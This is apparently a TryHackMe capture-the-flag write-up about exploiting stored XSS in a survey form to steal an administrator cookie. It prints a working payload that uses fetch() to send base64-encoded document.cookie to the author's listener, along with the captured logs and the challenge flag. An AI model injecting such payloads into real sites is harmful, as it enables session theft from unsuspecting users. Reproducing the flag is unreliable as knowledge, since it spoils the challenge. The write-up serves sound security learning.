---

title: "Cupid’s Matchmaker THM Writeup – Stored XSS Cookie Theft"
date: 2026-07-26 22:30:00 +0530
categories: [ctf, tryhackme]
tags: [tryhackme, xss, stored-xss, web, javascript]
description: "Exploiting a Stored Cross-Site Scripting (XSS) vulnerability in the Cupid challenge to retrieve the administrator's cookie and obtain the flag."
image:
  path: /assets/img/lafbctf2026e3-banner.png
---
## Overview
This this my final challenge in **Love at First Breach 2026**

During enumeration of the web application, I discovered a survey functionality that accepted user input without properly sanitizing it. While the payload did not execute immediately, further testing revealed that the submitted content was later viewed by an administrator (or an automated review bot), making the application vulnerable to **Stored Cross-Site Scripting (Stored XSS)**.

By leveraging this vulnerability, I was able to capture the administrator's cookie and recover the challenge flag.

---

# Enumeration

The challenge began with network reconnaissance to identify the available services running on the target machine. An Nmap scan revealed two primary attack surfaces:

| Port | Service | Version |
|------|---------|---------|
| 631 | CUPS (IPP) | CUPS 2.4.12 |
| 5000 | HTTP | Web Application |

Since CUPS had recently been affected by several publicly disclosed vulnerabilities, the initial focus was directed toward the printing service before moving on to the web application.

---

### Investigating the CUPS Service

The service running on **TCP port 631** was identified as **CUPS 2.4.12**.

```bash
curl http://IP:631/
```

The server responded with a **403 Forbidden** page while exposing the following server header:

```text
Server: CUPS/2.4 IPP/2.1
```

Because of the recent OpenPrinting vulnerability chain (CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, and CVE-2024-47177), further investigation was performed using Metasploit.

Searching Metasploit for CUPS-related modules revealed the following exploit:

```text
exploit/multi/misc/cups_ipp_remote_code_execution
```

The module documentation showed that it targets vulnerable versions of:

- cups-browsed
- libcupsfilters
- libppd
- cups-filters

The exploit works by hosting a malicious IPP printer and relies on a vulnerable **cups-browsed** client automatically discovering and interacting with the printer. Since the exploit is **event-dependent**, successful exploitation requires a victim to interact with the advertised printer, rather than simply having TCP port 631 open.

After reviewing the exploit requirements and the target configuration, no direct exploitation path through CUPS could be confirmed. So i shifted to the second exposed service running on port **5000**.

---

### Investigating the Web Service
Initial directory enumeration was performed against the web application.

```bash
ffuf -u http://IP:5000/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

revealed
```

admin    -> 302 Found redirected to login
login    -> 200 OK
logout   -> 302 Found
survey   -> 200 OK
```

The discovered endpoints were:

* `/login`
* `/logout` 
* `/admin`
* `/survey`

The `/admin` endpoint redirected to the login page, indicating authentication was required, Tried diffrent things but dint workout.
The `/survey` endpoint accepted user input and appeared to display submitted content.

---

## Testing the Survey

I experimented with multiple payloads to determine whether user input was filtered or escaped.

Although the payloads did not execute in my own browser, the application accepted and stored the submitted content. This suggested that another user (mentioned in discription of challenge ie real humans read your personality survey and personally match you with compatible singles) would eventually review the survey submissions.

by some online research that behavior is commonly associated with **Stored XSS**.

---

## Exploitation

To verify the vulnerability, I started a simple HTTP server to capture incoming requests.

```bash
python -m http.server 8000
```

I then submitted the following payload through the survey form:

```html
<script>
fetch('http://192.168.156.46:8000/?cookie=' + btoa(document.cookie));
</script>
```

### Payload Breakdown

```javascript
document.cookie
```

Reads all cookies available to JavaScript.

```javascript
btoa(document.cookie)
```

Base64-encodes the cookie so it can safely be transmitted within a URL.

```javascript
fetch(...)
```

Sends the encoded cookie to my local HTTP server.

---

## Capturing the Cookie

Shortly after submitting the survey, my HTTP server received several requests.

```text
[spirit@archlinux lafb2026e3]$ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
IP - - [26/Jul/2026 22:02:22] "GET /?cookie=ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59 HTTP/1.1" 200 -
IP - - [26/Jul/2026 22:02:22] "GET /?cookie=ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59 HTTP/1.1" 200 -
IP - - [26/Jul/2026 22:02:22] "GET /?cookie=ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59 HTTP/1.1" 200 -
IP - - [26/Jul/2026 22:02:22] "GET /?cookie=ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59 HTTP/1.1" 200 -
IP - - [26/Jul/2026 22:02:22] "GET /?cookie=ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59 HTTP/1.1" 200 -
IP - - [26/Jul/2026 22:03:33] "GET /?cookie=ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59 HTTP/1.1" 200 -

```

The repeated requests indicated that the survey entry was rendered multiple times, causing the JavaScript payload to execute repeatedly.

---

## Decoding the Cookie

The captured value was:

```text
ZmxhZz1USE17WFNTX0N1UDFkX1N0cjFrM3NfQWc0MW59
```

Decoding it with Base64 produced:

```text
flag=THM{XSS_Cup1d_Str1k3s_Ag41n}
```

---

## Flag

```text
THM{XSS_Cup1d_Str1k3s_Ag41n}
```

---

## Why This Worked

The application stored user input and later rendered it without properly escaping HTML or JavaScript.

The attack flow was:

```text
Survey Submission
        │
        ▼
Stored by Application
        │
        ▼
User or Admin Reviews Submission
        │
        ▼
Injected JavaScript Executes
        │
        ▼
document.cookie Read
        │
        ▼
Cookie Sent to Attacker
        │
        ▼
Flag Retrieved
```

Because the administrator's cookie was accessible via `document.cookie`, the payload successfully transmitted it to the listening HTTP server.

---

## Lessons Learned

This challenge demonstrates how dangerous Stored XSS vulnerabilities can be. Unlike reflected XSS, the malicious payload is permanently stored by the application and executes whenever another user views the affected content.

Proper output encoding, input validation, and the use of security controls such as `HttpOnly` cookies and a strong Content Security Policy (CSP) significantly reduce the impact of these vulnerabilities.

---

## Final Thoughts

Although the application exposed several interesting endpoints, the survey functionality proved to be the critical attack surface. A simple Stored XSS payload was enough to execute JavaScript in the administrator's browser, exfiltrate the session cookie, and recover the challenge flag.

This was a great reminder that even small features like feedback or survey forms can become high-impact attack vectors when user input is not safely handled.
